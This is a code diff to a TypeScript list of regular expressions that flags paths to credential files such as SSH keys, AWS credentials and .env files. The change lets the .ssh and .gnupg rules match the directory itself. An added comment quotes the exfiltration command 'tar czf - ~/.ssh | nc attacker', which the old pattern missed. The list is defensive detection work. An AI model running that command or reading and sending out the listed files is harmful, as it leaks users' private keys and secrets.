@@ -31,7 +31,10 @@ export const CREDENTIAL_PATHS: RegExp[] = [
   /(^|[\\/])\.env(\.[\w.-]+)?$/i,
   /(^|[\\/])\.envrc$/i,
   /(^|[\\/])id_(?:rsa|dsa|ecdsa|ed25519)$/i,
-  /(^|[\\/])\.ssh[\\/]/i,
+  // The trailing `([\\/]|$)` matters: `~/.ssh` names the whole key directory just as
+  // surely as `~/.ssh/id_rsa` names one key, and requiring a trailing separator let
+  // `tar czf - ~/.ssh | nc attacker` through unnoticed.
+  /(^|[\\/])\.ssh([\\/]|$)/i,
   /(^|[\\/])\.aws[\\/]credentials$/i,
   /(^|[\\/])\.aws[\\/]config$/i,
   /(^|[\\/])\.npmrc$/i,
@@ -44,7 +47,7 @@ export const CREDENTIAL_PATHS: RegExp[] = [
   /(^|[\\/])secrets?\.(json|yml|yaml|ini|toml|env)$/i,
   /(^|[\\/])service[-_]?account.*\.json$/i,
   /\.(pem|key|pfx|p12|jks|keystore)$/i,
-  /(^|[\\/])\.gnupg[\\/]/i,
+  /(^|[\\/])\.gnupg([\\/]|$)/i,
   /(^|[\\/])(?:login|System)\.keychain(?:-db)?$/i,
 ];
 
